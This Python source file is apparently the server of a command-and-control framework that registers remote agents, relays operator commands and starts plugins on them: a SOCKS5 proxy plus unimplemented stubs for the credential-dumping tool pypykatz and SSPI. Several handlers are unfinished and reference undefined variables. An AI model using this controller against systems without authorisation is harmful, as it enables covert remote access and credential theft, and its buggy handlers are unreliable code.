import os
import uuid
import asyncio
from multiplexor.operator.protocol import *
from multiplexor.logger.logger import *
from multiplexor.agenthandler import *
from multiplexor.protocol.server import *
from multiplexor.plugins.plugins import *
from multiplexor.plugins.socks5.socks5plugin import *

class MultiplexorServer:
	def __init__(self, logQ):
		self.transports = []
		self.ophandlers = []
		self.agents = {}
		self.operators = {}
		self.logger = Logger('MultiplexorServer', logQ = logQ)
		self.shutdown_evt = asyncio.Event()
		self.agent_dispatch_queue = asyncio.Queue()
		self.operator_dispatch_queue = asyncio.Queue()
		
		self.multiplexor_event_q = asyncio.Queue() #this queue is used to dispatch event messages to all operators connected
		                                          #such event are: logs, plugin created, agent connected, plugin terminated, agent disconnected
		
		self.agent_register_tokens = {} #id - token
		
	##################################################################################################
	##################################################################################################
	
	def add_transport(self, transport):
		print('adding transport')
		transport.agent_dispatch_queue = self.agent_dispatch_queue
		self.transports.append(transport)
		asyncio.ensure_future(transport.run())
		
	##################################################################################################
	##################################################################################################
	@mpexception
	async def handle_operator_in(self, operator):
		while not self.shutdown_evt.is_set() or not operator.transport_closed.is_set():
			op_cmd = await operator.multiplexor_cmd_in.get()
			if not op_cmd:
				print('queue broken!')
				return
			await self.logger.debug('Operator sent this: %s' % op_cmd)
			if op_cmd.cmdtype == OperatorCmdType.LIST_AGENTS:
				rply = OperatorListAgentsRply()
				for k in self.agents:
					rply.agents.append(k)
				
				await operator.multiplexor_cmd_out.put(rply)
				
			elif op_cmd.cmdtype == OperatorCmdType.GET_AGENT_INFO:
				
				try:
					agent = self.agents[op_cmd.agent_id]
				except Exception as e:
					await self.logger.debug('Operator tried to slect and unknown agent %s' % op_cmd.agent_id)
				else:
					rply = OperatorGetAgentInfoRply()
					rply.agent_id = op_cmd.agent_id
					rply.agentinfo = self.agents[op_cmd.agent_id].info
					await operator.multiplexor_cmd_out.put(rply)
			
			elif op_cmd.cmdtype == OperatorCmdType.GET_PLUGINS:
				try:
					agent = self.agents[op_cmd.agent_id]
				except Exception as e:
					await self.logger.debug('Operator tried to slect and unknown agent %s' % op_cmd.agent_id)
				else:
					rply = OperatorListPluginsRply()
					rply.agent_id = op_cmd.agent_id
					for k in agent.plugins:
						rply.plugins.append(k)
					await operator.multiplexor_cmd_out.put(rply)
				
			elif op_cmd.cmdtype == OperatorCmdType.GET_PLUGIN_INFO:
				try:
					agent = self.agents[op_cmd.agent_id]
					plugin = agent.plugins[op_cmd.plugin_id]
					
				except Exception as e:
					await self.logger.debug('Operator tried to slect and unknown agent %s and/or unknown pugin id %s' % (op_cmd.agent_id, op_cmd.plugin_id))
				else:
					rply = OperatorGetPluginInfoRply()
					rply.agent_id = op_cmd.agent_id
					rply.plugin_id = op_cmd.plugin_id
					for k in agent.plugins:
						rply.plugins.append(k)
					await operator.multiplexor_cmd_out.put(rply)
				
			elif op_cmd.cmdtype == OperatorCmdType.START_PLUGIN:
				try:
					agent = self.agents[op_cmd.agent_id]					
				except Exception as e:
					await self.logger.debug('Operator tried to slect and unknown agent %s' % op_cmd.agent_id)
				else:
					try:
						await self.start_plugin(agent, op_cmd.plugin_type, op_cmd.plugin_data)
					except Exception as e:
						print(e)
						return
				
			else:
				await self.logger.debug('Not implemented operator command!')
	
	async def handle_new_operator_event(self, ophandler):
		while not self.shutdown_evt.is_set() or not ophandler.trasnport_terminated_evt.is_set():
			operator = await ophandler.operator_dispatch_queue.get()
			self.operators[str(uuid.uuid4())] = operator
			await self.logger.debug('New operator in!')
			asyncio.ensure_future(self.handle_operator_in(operator))
			
	
	def add_ophandler(self, ophandler):
		print('adding ophandler')
		ophandler.operator_dispatch_queue = self.operator_dispatch_queue
		self.ophandlers.append(ophandler)
		asyncio.ensure_future(self.handle_new_operator_event(ophandler))
		asyncio.ensure_future(ophandler.run())
		

		
		
	##################################################################################################
	##################################################################################################
	@mpexception
	async def register_agent(self, agent):
		while not self.shutdown_evt.is_set() or not agent.trasnport_terminated_evt.is_set():
			cmd = await agent.packetizer.multiplexor_in.get()
			if agent.status == AgentStatus.CONNECTED:
				if cmd.cmdtype != ServerCMDType.REGISTER:
					await self.logger.debug('Agent just connected and doesnt want to register!')
					continue
				
				if cmd.agent_id:
					await self.logger.debug('Seems to be a reconnected agent with ID %s' % cmd.agent_id)
					if not cmd.agent_id in self.agent_register_tokens:
						await self.logger.debug('Not existing agent id! %s' % cmd.agent_id)
						return
					if not self.agent_register_tokens[cmd.agent_id] == cmd.secret:
						await self.logger.debug('Incorrect secret! %s' % (cmd.agent_id, cmd.secret))
						return
					
					await self.logger.debug('Agent re-registered sucsessfully')
					agent.status = AgentStatus.REGISTERED
					return
					
				await self.logger.debug('Agent wants to register!')
				cmd = MultiplexorRegister()
				cmd.secret = os.urandom(4)
				cmd.agent_id = str(uuid.uuid4())
				agent.status = AgentStatus.REGISTERING
				self.agent_register_tokens[cmd.agent_id] = cmd.secret
				await agent.packetizer.multiplexor_out.put(cmd)
				continue
				
			if agent.status == AgentStatus.REGISTERING:
				await self.logger.debug('Agent registering!')
				if not cmd.agent_id in self.agent_register_tokens:
					await self.logger.debug('Not existing agent id! %s' % cmd.agent_id)
					return
				if not self.agent_register_tokens[cmd.agent_id] == cmd.secret:
					await self.logger.debug('Incorrect secret! %s' % (cmd.agent_id, cmd.secret))
					return
					
				await self.logger.debug('Agent registered sucsessfully')
				agent.status = AgentStatus.REGISTERED
				agent.agent_id = cmd.agent_id
				self.agents[agent.agent_id] = agent
				return
		
	@mpexception
	async def start_plugin(self, agent, plugin_type, plugin_params):
		await self.logger.debug('start_plugin called')

		if plugin_type == PluginType.SOCKS5.value:
			await self.logger.debug('SOCKS5')
			plugin_obj = MultiplexorSocks5
			
		elif plugin_type == PluginType.PYPYKATZ.value:
			raise Exception('Not implemented')
		
		elif plugin_type == PluginType.SSPI.value:
			raise Exception('Not implemented')
		
		plugin_id = agent.add_plugin(plugin_obj, plugin_type, plugin_params)
		await self.logger.debug('starting')
		asyncio.ensure_future(agent.plugins[plugin_id].start())
		await self.logger.debug('started')
		cmd = MultiplexorPluginStart()
		cmd.plugin_id = str(plugin_id)
		cmd.plugin_type = str(plugin_type)
		cmd.plugin_params = plugin_params
		await agent.packetizer.multiplexor_out.put(cmd)
		await self.logger.debug('plugin start command sent to the client')

	
	@mpexception
	async def handle_agent_cmd_in(self, agent):
		while not self.shutdown_evt.is_set() or not agent.transport.trasnport_terminated_evt.is_set():
			
			#cmd is actually reply
			
			print('Agent %s said this: %s' % (agent.agent_id, cmd))
			
	@mpexception
	async def handle_agent_plugin_out(self, plugin):
		while not self.shutdown_evt.is_set():
			await agent.packetizer.multiplexor_out.put(cmd)
	
	@mpexception
	async def handle_agent_main(self, agent):
		#this msut be invoked after succsessful registration!
		while not self.shutdown_evt.is_set() or not agent.trasnport_terminated_evt.is_set():
			cmd = await agent.packetizer.multiplexor_in.get()
			if cmd.cmdtype == ServerCMDType.GET_INFO:
				await self.logger.debug(cmd.agent_info)
				#print(cmd.agent_id)
				agent.info = cmd.agent_info
				
			elif cmd.cmdtype == ServerCMDType.PLUGIN_DATA:
				if not cmd.plugin_id in agent.plugins:
					print('Got plugin data from %s for and unknown plugin id %s' % (agent.agent_id, cmd.plugin_id))
					continue
				print('Dispatching plugin data!')
				await agent.plugins[cmd.plugin_id].plugin_in.put(cmd.plugin_data)
				
			elif cmd.cmdtype == ServerCMDType.AGENT_LOG:
				#TODO
				await self.logQ.put(None)
				
			#elif cmd.cmdtype == ServerCMDType.PLUGIN_START:
			#	#TODO
			#	await self.logQ.put(None)
				
			#elif cmd.cmdtype == ServerCMDType.PLUGIN_STOP:
			#	#TODO
			#	await self.logQ.put(None)
			
			elif cmd.cmdtype == ServerCMDType.PLUGIN_STOPPED_EVT:
				if not cmd.plugin_id in agent.plugins:
					print('Got plugin data from %s for and unknown plugin id %s' % (agent.agent_id, cmd.plugin_id))
					continue
				await agent.plugins[cmd.plugin_id].plugin_in.put(cmd)
				await self.logger.info('Plugin stopped')
				
			elif cmd.cmdtype == ServerCMDType.PLUGIN_STARTED_EVT:
				#### Sanity check
				if not cmd.plugin_id in agent.plugins:
					print('Got plugin data from %s for and unknown plugin id %s' % (agent.agent_id, cmd.plugin_id))
					continue
				#### dispatching th event to the appropriate queue
				await agent.plugins[cmd.plugin_id].plugin_in.put(cmd)
				
				#### notifying all operators of the event
				rply = OperatorPluginStarted()
				rply.agent_id = agent.agent_id
				rply.plugin_id = cmd.plugin_id
					
				for k in self.operators:
					await self.operators[k].multiplexor_cmd_out.put(rply)
					
				await self.logger.info('Plugin started')
	
	@mpexception
	async def handle_agent(self, agent):
		#agent needs to register before we talk to her...
		await self.register_agent(agent)
		if agent.status == AgentStatus.REGISTERED:
			
			#by default we poll some basic info on the client...
			if not agent.info:
				cmd = MultiplexorGetInfo()
				await agent.packetizer.multiplexor_out.put(cmd)
			
			#now starting the main handler loop
			await self.logger.info('Invoking agent main...')
			await self.handle_agent_main(agent)
			await self.logger.debug('Agent dropped :(')
		else:
			print('Agent failed to register, let it go let it go...')
			return
	
	@mpexception
	async def run(self):
		while not self.shutdown_evt.is_set():
			agent = await self.agent_dispatch_queue.get()
			asyncio.ensure_future(self.handle_agent(agent))